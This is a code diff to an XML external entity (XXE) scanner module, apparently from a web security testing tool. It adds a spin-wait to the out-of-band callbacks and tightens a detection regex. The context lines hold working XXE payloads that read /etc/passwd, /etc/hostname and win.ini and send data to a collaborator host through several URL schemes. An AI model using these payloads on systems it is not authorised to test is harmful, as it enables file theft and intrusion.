@@ -284,7 +284,7 @@ public class XxeScanner implements ScanModule {
     /** Patterns that confirm actual file content was returned (for false positive prevention). */
     private static final Pattern LINUX_PASSWD_EVIDENCE = Pattern.compile("root:[x*]:0:0:");
     private static final Pattern WINDOWS_WIN_INI_EVIDENCE = Pattern.compile("\\[fonts\\]", Pattern.CASE_INSENSITIVE);
-    private static final Pattern WINDOWS_HOSTS_EVIDENCE = Pattern.compile("localhost", Pattern.CASE_INSENSITIVE);
+    private static final Pattern WINDOWS_HOSTS_EVIDENCE = Pattern.compile("127\\.0\\.0\\.1\\s+localhost", Pattern.CASE_INSENSITIVE);
 
     // ==================== OVERRIDES ====================
 
@@ -876,7 +876,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest1 = new AtomicReference<>();
         String collabPayload1 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB parameter entity external DTD",
-                interaction -> reportOobFinding(interaction, url, "Parameter entity external DTD load", sentRequest1.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest1.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "Parameter entity external DTD load", sentRequest1.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload1 != null) {
             String paramEntityDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload1 + "/xxe\">\n"
@@ -892,7 +898,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest2 = new AtomicReference<>();
         String collabPayload2 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB direct entity callback",
-                interaction -> reportOobFinding(interaction, url, "Direct entity HTTP callback", sentRequest2.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest2.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "Direct entity HTTP callback", sentRequest2.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload2 != null) {
             String directEntityDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY xxe SYSTEM \"http://" + collabPayload2 + "/xxe\">\n"
@@ -907,7 +919,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest3 = new AtomicReference<>();
         String collabPayload3 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB parameter entity HTTPS",
-                interaction -> reportOobFinding(interaction, url, "Parameter entity HTTPS callback", sentRequest3.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest3.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "Parameter entity HTTPS callback", sentRequest3.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload3 != null) {
             String httpsParamEntityDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % xxe SYSTEM \"https://" + collabPayload3 + "/xxe\">\n"
@@ -925,7 +943,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest4 = new AtomicReference<>();
         String collabPayload4 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB data exfiltration via parameter entity",
-                interaction -> reportOobFinding(interaction, url, "Data exfiltration via parameter entity", sentRequest4.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest4.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "Data exfiltration via parameter entity", sentRequest4.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload4 != null) {
             String exfilDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n"
@@ -942,7 +966,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest5 = new AtomicReference<>();
         String collabPayload5 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB standalone parameter entity",
-                interaction -> reportOobFinding(interaction, url, "Standalone XML parameter entity OOB", sentRequest5.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest5.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "Standalone XML parameter entity OOB", sentRequest5.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload5 != null) {
             String standaloneOobXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                     + "<!DOCTYPE foo [\n"
@@ -959,7 +989,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest6 = new AtomicReference<>();
         String collabPayload6 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB standalone direct entity",
-                interaction -> reportOobFinding(interaction, url, "Standalone XML direct entity OOB", sentRequest6.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest6.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "Standalone XML direct entity OOB", sentRequest6.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload6 != null) {
             String standaloneDirectXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                     + "<!DOCTYPE foo [\n"
@@ -975,7 +1011,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest7 = new AtomicReference<>();
         String collabPayload7 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB FTP exfiltration",
-                interaction -> reportOobFinding(interaction, url, "FTP-based OOB exfiltration", sentRequest7.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest7.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "FTP-based OOB exfiltration", sentRequest7.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload7 != null) {
             String ftpDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
@@ -992,7 +1034,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest8 = new AtomicReference<>();
         String collabPayload8 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB JAR protocol",
-                interaction -> reportOobFinding(interaction, url, "JAR protocol OOB callback", sentRequest8.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest8.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "JAR protocol OOB callback", sentRequest8.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload8 != null) {
             String jarDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % xxe SYSTEM \"jar:http://" + collabPayload8 + "/xxe!/test\">\n"
@@ -1008,7 +1056,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest9 = new AtomicReference<>();
         String collabPayload9 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB netdoc protocol",
-                interaction -> reportOobFinding(interaction, url, "netdoc protocol OOB callback", sentRequest9.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest9.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "netdoc protocol OOB callback", sentRequest9.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload9 != null) {
             String netdocDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % xxe SYSTEM \"netdoc://" + collabPayload9 + "/xxe\">\n"
@@ -1024,7 +1078,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest10 = new AtomicReference<>();
         String collabPayload10 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB gopher protocol",
-                interaction -> reportOobFinding(interaction, url, "gopher protocol OOB callback", sentRequest10.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest10.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "gopher protocol OOB callback", sentRequest10.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload10 != null) {
             String gopherDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % xxe SYSTEM \"gopher://" + collabPayload10 + ":70/_xxe\">\n"
@@ -1040,7 +1100,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest11 = new AtomicReference<>();
         String collabPayload11 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB PHP filter chain",
-                interaction -> reportOobFinding(interaction, url, "PHP filter chain OOB callback", sentRequest11.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest11.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "PHP filter chain OOB callback", sentRequest11.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload11 != null) {
             String phpFilterDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://"
@@ -1057,7 +1123,13 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest12 = new AtomicReference<>();
         String collabPayload12 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB PHP expect wrapper",
-                interaction -> reportOobFinding(interaction, url, "PHP expect wrapper OOB callback", sentRequest12.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest12.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, "PHP expect wrapper OOB callback", sentRequest12.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload12 != null) {
             String phpExpectDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY xxe SYSTEM \"expect://nslookup+" + collabPayload12 + "\">\n"
@@ -1072,8 +1144,14 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest13 = new AtomicReference<>();
         String collabPayload13 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB /etc/passwd exfiltration via external DTD",
-                interaction -> reportOobFinding(interaction, url,
-                        "Data exfiltration /etc/passwd via external DTD + nested param entities", sentRequest13.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest13.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url,
+                            "Data exfiltration /etc/passwd via external DTD + nested param entities", sentRequest13.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload13 != null) {
             String exfilPasswdDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
@@ -1094,8 +1172,14 @@ public class XxeScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> sentRequest14 = new AtomicReference<>();
         String collabPayload14 = collaboratorManager.generatePayload(
                 "xxe-scanner", url, "xml_body", "XXE OOB win.ini exfiltration via external DTD",
-                interaction -> reportOobFinding(interaction, url,
-                        "Data exfiltration C:/Windows/win.ini via external DTD + nested param entities", sentRequest14.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && sentRequest14.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url,
+                            "Data exfiltration C:/Windows/win.ini via external DTD + nested param entities", sentRequest14.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload14 != null) {
             String exfilWinIniDtd = "<!DOCTYPE foo [\n"
                     + "  <!ENTITY % file SYSTEM \"file:///C:/Windows/win.ini\">\n"
